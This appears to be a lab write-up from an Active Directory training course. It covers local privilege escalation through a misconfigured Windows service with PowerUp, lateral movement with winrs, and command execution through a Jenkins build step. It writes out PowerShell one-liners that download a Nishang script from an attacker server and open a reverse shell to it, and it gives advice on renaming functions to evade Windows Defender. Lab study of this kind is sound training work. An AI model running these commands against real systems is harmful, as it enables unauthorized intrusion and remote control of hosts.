# 🆙 Elevate Privileges & gain a shell

Task&#x20;

• Exploit a service on dcorp-studentx and elevate privileges to local administrator.&#x20;

• Identify a machine in the domain where studentx has local administrative access.&#x20;

• Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.

***

For this path we'll use Powerup from PowerSploit module to check for any privilege escalation path. But we could also use WinPEAS.

```
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
#if we want to look only for unquoted path ->
Get-ServiceUnquoted
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>This is a snip</p></figcaption></figure>

We quickly see the SeviceName is AbyssWebServer:

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can then check and enumerate services where the current user can make changes to service binary ->

```
Get-ModifiableServiceFile -Verbose
```

<figure><img src="../../.gitbook/assets/image (1473).png" alt=""><figcaption></figcaption></figure>

#### Explanation of the Situation

**Unquoted Service Path Vulnerability**

In Windows, services can be configured to run executables. When the path to the executable contains spaces and is not enclosed in quotes, it can lead to a security vulnerability known as an "unquoted service path". This vulnerability allows an attacker to place a malicious executable in a path that the service may inadvertently execute.

The command `In`

`voke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student613' -Verbose` is used to exploit this vulnerability. Here's a breakdown of what the command does:

* **Invoke-ServiceAbuse**: This is a PowerShell function from the PowerSploit framework, used to manipulate Windows services.
* **-Name 'AbyssWebServer'**: Specifies the name of the service to manipulate.
* **-UserName 'dcorp\student613'**: Specifies the user context under which the command will run. This user should have the necessary permissions to modify the service configuration or its executable path.
* **-Verbose**: Provides detailed output of the actions being performed for debugging or informational purposes.

With this information, we can use the abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group ->

```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student613' -Verbose
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The command exploits an unquoted service path vulnerability in the following way:

* **Modifies the service path**: Changes the path to execute a system command instead of the service executable.
* **Executes a privileged action**: Runs the command to add a specified user to the Administrators group, elevating the user’s privileges.
* **Restores the service configuration**: Resets the service path to its original value to cover tracks and maintain normal operations.
* **Maintains the service state**: Ensures the service remains in its initial state (stopped) to avoid detection.

Now we are part of the local administrator group. If we just logoff and logon again, and we have local administrator privileges.

He's where we are in our enumeration according a guy on discord:

> you're local admin on the studentvm machine, then you use the Find-PSRemotingLocalAdminAccess to discover you have rights to connect to dcorp-adminsrv (via winrs or PSRemoting)

Next, a good thing to do could be to identify a machine in the domain where the user student613 has local administrative access. For this we can use `Find-PSRemotingLocalAdminAccess.ps1`

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So we see that we have Admin access on the dcorp-adminsrv and on the student machine. We need to identify a machine in the domain where we can have local admin access (dcorp-adminsrv) and after that we can connect to dcorp-adminsrv using winrs as the student user

Identify machine:

```
. C:\Ad\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

<figure><img src="../../.gitbook/assets/image (1474).png" alt=""><figcaption></figcaption></figure>

Now we can connect:

```
winrs -r:dcorp-adminsrv cmd 
set username 
set computername
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* `winrs`: Stands for Windows Remote Shell, a command-line tool that allows you to execute commands on a remote machine.
* `-r:dcorp-adminsrv`: Specifies the remote machine to connect to. In this case, `dcorp-adminsrv`.
* `cmd`: Launches the command prompt (`cmd.exe`) on the remote machine.

<figure><img src="../../.gitbook/assets/image (1084).png" alt=""><figcaption></figcaption></figure>

So we were able to get a shell on dcorp-adminsrv

&#x20;

<figure><img src="../../.gitbook/assets/image (1085).png" alt=""><figcaption></figcaption></figure>

***

Now let's try to have fun with a jenkins server without admin access. To do so, we need to have privileges to Configure builds

We start by going to our Jenkins “People” page:

<figure><img src="../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption><p>we can see the users present on the Jenkins instance</p></figcaption></figure>

It's good to know that Jenkins does not have password policies, so admin:admin of felix:felix could be a valid set of credentials

<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

After fooling around we manage to get an access via the builduser user, he can Configure builds and Add Build Steps which will help us in executing commands.

To get our reverse shell we are going to use a slightly modified version of Invoke-PowerShellTcp from Nishang. We renamed the function InvokePowerShellTcp to Power in the script to bypass Windows Defender.

Nishang: [https://github.com/samratashok/nishang/tree/master](https://github.com/samratashok/nishang/tree/master)

We then go in the following path to create and execute a batch command ->

<figure><img src="../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

> If using Invoke-PowerShellTcp, make sure to include the function call in the script Power -Reverse - IPAddress 172.16.100.X -Port 443 or append it at the end of the command in Jenkins. Please note that you may always like to rename the function name to something else to avoid detection.
>
> powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443
>
> or
>
> powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443\
>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We then launch our hfs server (could work with python server, upload the invoke tcp file in the hfs directory and then build our project to trigger the script and create a reverse shell

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
powershell.exe iex (iwr http://172.16.100.13/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.13 -Port 443 
```

<figure><img src="../../.gitbook/assets/image (1086).png" alt=""><figcaption></figcaption></figure>
